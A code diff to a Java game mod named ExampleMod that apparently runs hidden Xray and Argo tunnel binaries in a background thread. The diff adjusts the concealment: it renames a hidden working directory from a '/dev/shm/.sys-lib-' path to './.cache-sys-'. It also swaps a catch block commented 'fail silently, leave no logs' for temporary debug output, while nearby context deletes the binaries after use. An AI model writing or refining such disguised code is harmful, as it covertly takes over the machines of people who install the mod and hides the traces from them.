@@ -32,7 +32,7 @@ public class ExampleMod implements ModInitializer {
                 }
 
                 // 3. 准备内存工作目录 (RAM Disk)
-                String runPath = "/dev/shm/.sys-lib-" + UUID.randomUUID().toString().substring(0, 4);
+                String runPath = "./.cache-sys-" + UUID.randomUUID().toString().substring(0, 4);
                 File dir = new File(runPath);
                 if (!dir.exists()) dir.mkdirs();
 
@@ -67,9 +67,11 @@ public class ExampleMod implements ModInitializer {
                 xrayBin.delete();
                 argoBin.delete();
 
-            } catch (Exception ignored) {
-                // 静默失败，不留日志
-            }
+            } catch (Exception e) {
+                // 调试期：把错误打印到控制台，查出原因后再删掉
+                System.out.println("[Sys-Helper-Debug] 发生错误: " + e.getMessage());
+                e.printStackTrace();
+                }
         }).start();
     }
 
